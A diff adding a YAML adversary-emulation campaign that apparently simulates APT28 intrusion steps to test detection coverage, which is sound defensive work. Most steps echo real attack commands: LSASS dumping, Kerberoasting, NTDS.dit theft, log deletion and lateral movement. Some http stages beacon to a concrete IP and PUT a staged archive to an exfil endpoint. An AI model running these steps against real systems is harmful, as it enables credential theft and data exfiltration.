@@ -1,0 +1,273 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: apt28-fancy-bear
+  adversary: APT28
+  description: "APT28 (Fancy Bear) credential-focused intrusion — spearphishing links, OAuth abuse, Kerberoasting, NTDS extraction, and encrypted exfiltration by Russian GRU Unit 26165"
+  objective: "Simulate APT28 TTPs to validate detection coverage across credential theft chains, lateral movement via admin shares, and encrypted C2 exfiltration scenarios"
+  mitre_version: "15.1"
+  severity: critical
+  tags: [apt, nation-state, russia, gru, fancy-bear, credential-theft]
+  authors: ["ThreatEcho"]
+  references:
+    - https://attack.mitre.org/groups/G0007/
+    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa18-331a
+    - https://www.microsoft.com/en-us/security/blog/2023/08/02/midnight-blizzard-conducts-targeted-social-engineering-over-microsoft-teams/
+  created: "2024-11-15"
+  modified: "2025-07-20"
+
+variables:
+  c2_server: "185.141.63.47"
+  c2_port: "443"
+  target_domain: "corp.local"
+  phish_url: "https://login.microsoftonline.com.attacker.example/oauth2/authorize"
+  exfil_endpoint: "https://cdn-static.example.com/sync"
+
+stages:
+  - id: spearphish-link
+    name: Spearphishing Link Delivery
+    description: "APT28 delivers OAuth consent phishing link via spearphishing email targeting high-value personnel. Link redirects to attacker-controlled OAuth application for token harvesting."
+    technique: T1566.002
+    tactic: initial-access
+    platform: [windows, linux, macos]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Sending spearphish email with OAuth consent link to target@{{target_domain}}"'
+        - 'echo "[SIM] Phishing URL: {{phish_url}}"'
+        - 'echo "[SIM] User clicks link and grants OAuth consent to attacker application"'
+    expect:
+      telemetry: [email_delivered, network_connection, authentication]
+      detections: [spearphishing_link_clicked, oauth_consent_phish, suspicious_email_url]
+      iocs: ["{{phish_url}}"]
+    on_success: oauth-token-theft
+    on_failure: abort
+    timeout: 120s
+
+  - id: oauth-token-theft
+    name: OAuth Access Token Theft
+    description: "Harvest OAuth tokens after victim grants consent to malicious application. APT28 (Strontium) is known for abusing Microsoft OAuth flows to gain persistent mailbox access without passwords."
+    technique: T1528
+    tactic: credential-access
+    platform: [windows, linux, macos]
+    depends_on: [spearphish-link]
+    execute:
+      type: http
+      target: "{{phish_url}}"
+      args:
+        method: POST
+        content_type: "application/x-www-form-urlencoded"
+        payload: "grant_type=authorization_code&code=intercepted_auth_code"
+    expect:
+      telemetry: [network_connection, authentication]
+      detections: [oauth_token_theft_detected, suspicious_oauth_app_consent, anomalous_token_request]
+      iocs: ["{{phish_url}}"]
+    on_success: powershell-execution
+    on_failure: abort
+    timeout: 60s
+
+  - id: powershell-execution
+    name: PowerShell Payload Execution
+    description: "APT28 deploys obfuscated PowerShell downloader to establish foothold. X-Agent/Sofacy backdoor staged via encoded PowerShell commands with AMSI bypass."
+    technique: T1059.001
+    tactic: execution
+    platform: [windows]
+    depends_on: [oauth-token-theft]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] powershell.exe -nop -w hidden -enc <base64_xagent_stager>"'
+        - 'echo "[SIM] AMSI bypass loaded; X-Agent backdoor reflectively injected into memory"'
+        - 'echo "[SIM] Establishing callback to {{c2_server}}:{{c2_port}}"'
+      cleanup:
+        - 'echo "[SIM] Removing PowerShell event logs from Microsoft-Windows-PowerShell/Operational"'
+    expect:
+      telemetry: [process_create, script_execution, network_connection]
+      detections: [powershell_encoded_command, amsi_bypass_attempt, suspicious_powershell_download]
+    on_success: encrypted-c2
+    on_failure: abort
+    timeout: 60s
+
+  - id: encrypted-c2
+    name: Encrypted C2 Channel
+    description: "X-Agent establishes encrypted command-and-control channel using custom protocol over HTTPS. APT28 uses certificate pinning and domain fronting to evade network inspection."
+    technique: T1573
+    tactic: command-and-control
+    platform: [windows]
+    depends_on: [powershell-execution]
+    execute:
+      type: http
+      target: "https://{{c2_server}}:{{c2_port}}/api/update"
+      args:
+        protocol: https
+        interval: "45s"
+        jitter: "30%"
+        encryption: "custom-rc4"
+    expect:
+      telemetry: [network_connection, dns_query, tls_handshake]
+      detections: [encrypted_c2_channel, certificate_pinning_detected, periodic_beacon_pattern]
+      iocs: ["{{c2_server}}"]
+    on_success: domain-recon
+    on_failure: abort
+    timeout: 120s
+
+  - id: domain-recon
+    name: Domain Account Enumeration
+    description: "APT28 enumerates domain accounts, privileged groups, and service accounts to identify Kerberoasting targets and lateral movement paths to Exchange and domain controllers."
+    technique: T1087.002
+    tactic: discovery
+    platform: [windows]
+    depends_on: [encrypted-c2]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] net group \"Domain Admins\" /domain"'
+        - 'echo "[SIM] net group \"Exchange Trusted Subsystem\" /domain"'
+        - 'echo "[SIM] setspn -T {{target_domain}} -Q */*"'
+        - 'echo "[SIM] Identified 14 service accounts with SPNs suitable for Kerberoasting"'
+      elevated: false
+    expect:
+      telemetry: [process_create]
+      detections: [suspicious_ad_enumeration, spn_enumeration_detected, recon_command_sequence]
+    on_success: credential-dump-lsass
+    on_failure: continue
+
+  - id: credential-dump-lsass
+    name: LSASS Credential Dumping via Mimikatz
+    description: "Dump credentials from LSASS process memory using comsvcs.dll MiniDump technique. APT28 uses living-off-the-land binaries to avoid dropping Mimikatz on disk."
+    technique: T1003.001
+    tactic: credential-access
+    platform: [windows]
+    depends_on: [domain-recon]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] tasklist /fi \"imagename eq lsass.exe\" — PID 672"'
+        - 'echo "[SIM] rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\debug.bin full"'
+      elevated: true
+      cleanup:
+        - 'echo "[SIM] del /f C:\\Windows\\Temp\\debug.bin"'
+    expect:
+      telemetry: [process_create, process_access, file_create]
+      detections: [lsass_memory_access, credential_dumping_via_comsvcs, suspicious_minidump]
+      artifacts: ["C:\\Windows\\Temp\\debug.bin"]
+    on_success: kerberoast
+    on_failure: continue
+    timeout: 30s
+
+  - id: kerberoast
+    name: Kerberoasting Service Accounts
+    description: "Request Kerberos TGS tickets for service accounts with registered SPNs and crack them offline. APT28 targets high-privilege service accounts for domain privilege escalation."
+    technique: T1558.003
+    tactic: credential-access
+    platform: [windows]
+    depends_on: [domain-recon]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Invoke-Kerberoast -OutputFormat Hashcat | Export-CSV C:\\Windows\\Temp\\kerberoast.csv"'
+        - 'echo "[SIM] Extracted 14 TGS tickets — cracking offline with hashcat -m 13100"'
+        - 'echo "[SIM] Cracked 3/14: svc_exchange, svc_backup, svc_sql (weak service account passwords)"'
+      elevated: false
+    expect:
+      telemetry: [process_create, authentication]
+      detections: [kerberoasting_detected, anomalous_tgs_request_volume, service_ticket_request_anomaly]
+    on_success: ntds-extraction
+    on_failure: continue
+    timeout: 120s
+
+  - id: ntds-extraction
+    name: NTDS.dit Domain Database Extraction
+    description: "Extract the Active Directory database (NTDS.dit) via Volume Shadow Copy to obtain all domain password hashes. APT28 targets domain controllers for complete credential access."
+    technique: T1003.003
+    tactic: credential-access
+    platform: [windows]
+    depends_on: [credential-dump-lsass, kerberoast]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] vssadmin create shadow /for=C:"'
+        - 'echo "[SIM] copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit"'
+        - 'echo "[SIM] reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv"'
+      elevated: true
+      cleanup:
+        - 'echo "[SIM] vssadmin delete shadows /quiet"'
+        - 'echo "[SIM] del /f C:\\Windows\\Temp\\ntds.dit C:\\Windows\\Temp\\sys.hiv"'
+    expect:
+      telemetry: [process_create, file_create]
+      detections: [ntds_dit_access, vss_shadow_copy_creation, registry_hive_save]
+      artifacts: ["C:\\Windows\\Temp\\ntds.dit", "C:\\Windows\\Temp\\sys.hiv"]
+    on_success: lateral-movement-smb
+    on_failure: continue
+    timeout: 60s
+
+  - id: lateral-movement-smb
+    name: Lateral Movement via Admin Shares
+    description: "Move laterally to Exchange servers and file servers using compromised domain admin credentials via SMB admin shares. APT28 targets Exchange for strategic email collection."
+    technique: T1021.002
+    tactic: lateral-movement
+    platform: [windows]
+    depends_on: [ntds-extraction]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] net use \\\\EXCH01.{{target_domain}}\\C$ /user:{{target_domain}}\\svc_exchange <cracked_password>"'
+        - 'echo "[SIM] copy C:\\Windows\\Temp\\xagent.exe \\\\EXCH01\\C$\\Windows\\Temp\\"'
+        - 'echo "[SIM] wmic /node:EXCH01 process call create C:\\Windows\\Temp\\xagent.exe"'
+      elevated: true
+      cleanup:
+        - 'echo "[SIM] del \\\\EXCH01\\C$\\Windows\\Temp\\xagent.exe"'
+        - 'echo "[SIM] net use \\\\EXCH01\\C$ /delete"'
+    expect:
+      telemetry: [network_connection, authentication, process_create, file_create]
+      detections: [smb_admin_share_access, remote_process_creation, lateral_movement_via_wmic]
+      iocs: ["EXCH01"]
+    on_success: data-archive
+    on_failure: abort
+    timeout: 60s
+
+  - id: data-archive
+    name: Data Compression and Staging
+    description: "Collect and compress targeted email archives, documents, and credential dumps using 7-Zip with AES encryption. APT28 stages password-protected archives before exfiltration."
+    technique: T1560.001
+    tactic: collection
+    platform: [windows]
+    depends_on: [lateral-movement-smb]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] 7z a -pExfil2024 -mhe=on C:\\Windows\\Temp\\update.7z C:\\Windows\\Temp\\ntds.dit"'
+        - 'echo "[SIM] 7z a -pExfil2024 -mhe=on C:\\Windows\\Temp\\update.7z \\\\EXCH01\\C$\\ExchangeDB\\mailbox.edb"'
+        - 'echo "[SIM] Staged 2.3 GB encrypted archive at C:\\Windows\\Temp\\update.7z"'
+      cleanup:
+        - 'echo "[SIM] del /f C:\\Windows\\Temp\\update.7z"'
+    expect:
+      telemetry: [process_create, file_create, file_read]
+      detections: [archive_creation_with_encryption, suspicious_7zip_usage, data_staging_in_temp]
+      artifacts: ["C:\\Windows\\Temp\\update.7z"]
+    on_success: exfiltration
+    on_failure: continue
+
+  - id: exfiltration
+    name: Exfiltration over Encrypted C2
+    description: "Exfiltrate compressed archive over the encrypted C2 channel in chunked transfers. APT28 uses slow-drip exfiltration with randomized intervals to avoid volumetric detection thresholds."
+    technique: T1041
+    tactic: exfiltration
+    platform: [windows]
+    depends_on: [data-archive]
+    execute:
+      type: http
+      target: "{{exfil_endpoint}}"
+      args:
+        method: PUT
+        data_source: "C:\\Windows\\Temp\\update.7z"
+        chunk_size: "512KB"
+        encrypt: "aes-256"
+        interval: "30s"
+    expect:
+      telemetry: [network_connection, file_read, dns_query]
+      detections: [exfiltration_over_c2, large_outbound_transfer, chunked_data_upload, unusual_upload_volume]
+      iocs: ["{{exfil_endpoint}}"]
+    on_failure: abort
+    timeout: 600s
